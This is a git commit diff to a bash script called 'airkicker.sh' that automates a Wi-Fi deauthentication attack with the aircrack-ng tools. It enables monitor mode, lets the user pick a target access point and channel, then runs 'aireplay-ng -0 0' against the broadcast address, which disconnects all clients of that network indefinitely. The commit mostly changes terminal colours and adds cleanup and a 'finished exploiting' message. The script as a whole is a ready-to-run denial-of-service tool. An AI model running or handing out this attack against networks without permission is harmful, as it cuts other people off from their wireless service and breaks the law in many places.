5013c44045615ac15f48356f1d5887fa42c0e0d7
Rocco Himel <rockyrbn1847@gmail.com>
2026-04-19 20:56:49 -0400

    added more stuff to the script

--- airkicker.sh
+++ airkicker.sh
@@ -1,33 +1,45 @@
 #!/bin/bash
 ./figlet -f slant "AIRKICKER"
-echo -e "\033[1;34m[*] Granting root permission...\033[0m"
+echo -e "\033[1;32m[*] Granting root permission...\033[0m"
 sudo echo -e "\033[1;36m[+] Root permission granted!\033[0m"
 
 sudo airmon-ng
-echo -n "[?] Interface name: "
+echo -e -n "\033[1;35m[?] Interface name: \033[0m"
 read ifn
 echo "ifn => $ifn"
 sudo airmon-ng start ${ifn}
 
-echo -e "\033[1;34m[+] Searching for sources in 3 seconds, press CTRL-C to stop\033[0m"
+echo -e "\033[1;32m[+] Searching for sources in 3 seconds, press CTRL-C to stop\033[0m"
 sleep 3
 
+tput smcup
 sudo airodump-ng ${ifn}mon
-echo -e "\033[1;34m[+] Done!... Please enter source details\033[0m"
-echo -n "[?] Source BSSID: "
+tput rmcup
+
+echo -e "\033[1;32m[+] Done!... Please enter source details\033[0m"
+echo -e -n "\033[1;35m[?] Source BSSID: \033[0m"
 read bssid
 echo "bssid => $bssid"
-echo -n "[?] Source channel: "
+echo -e -n "\033[1;35m[?] Source channel: \033[0m"
 read channel
 echo "channel => $channel"
 
-echo -e "\033[1;34m[+] Testing source effectiveness in 3 seconds, press CTRL-C to stop\033[0m"
+echo -e "\033[1;32m[+] Testing source effectiveness in 3 seconds, press CTRL-C to stop\033[0m"
 sleep 3
+
+tput smcup
 sudo airodump-ng --bssid $bssid -c $channel ${ifn}mon
+tput rmcup
 
-echo -e "\033[1;34m[+] Targeting source clients in 3 seconds, press CTRL-C to stop\033[0m"
+echo -e "\033[1;32m[+] Targeting source clients in 3 seconds, press CTRL-C to stop\033[0m"
 sleep 3
-echo -e "\033[1;34m[*] Running...\033[0m"
+echo -e "\033[1;32m[*] Running... press CTRL-C to stop\033[1;34m"
 sudo aireplay-ng -0 0 -a $bssid -c FF:FF:FF:FF:FF:FF ${ifn}mon
+echo -e "\033[0m"
+echo "================ "
+echo -e "\033[1;36[+] Finished exploiting $bssid with DEAUTH packets\033[0m"
 
+sudo airmon-ng stop ${ifn}mon
+
+echo -e "\033[1;32[!] If you have any issues with WLAN, please restart your networking manager!\033[0m"
 
